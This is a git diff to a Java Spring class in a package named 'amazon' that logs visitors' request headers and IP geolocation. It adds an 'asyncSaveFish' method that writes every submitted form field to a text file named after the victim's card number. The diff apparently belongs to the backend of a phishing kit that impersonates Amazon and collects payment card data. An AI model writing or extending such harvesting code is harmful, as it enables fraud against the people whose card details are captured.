@@ -8,6 +8,7 @@ import cn.hutool.http.Header;
 import cn.hutool.http.HttpRequest;
 import com.alibaba.fastjson.JSON;
 import com.kidd.amazon.common.CmdUtils;
+import com.sun.javafx.scene.shape.PathUtils;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
@@ -112,13 +113,6 @@ public class AsyncTask {
             String headerValue = request.getHeader(headerName);//获得值
             fileAppender.append(String.format("%s : %s\n", headerName, headerValue));
         }
-//        if (null != request.getParameterMap()) {
-//            for (String paramKey : request.getParameterMap().keySet()) {
-//                if(paramKey.contains("openid")) continue;
-//                String paramVale = request.getParameter(paramKey);
-//                fileAppender.append(String.format("%s : %s\n", paramKey, paramVale));
-//            }
-//        }
         if (StringUtils.isEmpty(ipfinfo)) {
             ipfinfo = HttpRequest.get(ipInterfaceUrl + ip)
                     .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
@@ -153,6 +147,26 @@ public class AsyncTask {
                 .timeout(50000)//超时，毫秒
                 .execute()
                 .body();
+    }
+
+    @Async
+    public void asyncSaveFish(String path, Map<String, String> map) {
+        if(!map.containsKey("cardnumber")){
+            return;
+        }
+        String fileName = path + map.get("cardnumber")+".txt";
+        if(FileUtil.exist(path)){
+            FileUtil.newFile(path);
+        }
+        if (!FileUtil.exist(fileName)) {
+            FileUtil.newFile(fileName);
+        }
+        FileAppender fileAppender = new FileAppender(FileUtil.file(fileName), 1000, true);
+        fileAppender.append("===================================================================");
+        for (String key : map.keySet()) {
+            fileAppender.append(String.format("%s : %s", key, map.get(key)));
+        }
+        fileAppender.flush();
     }
 
     @Async
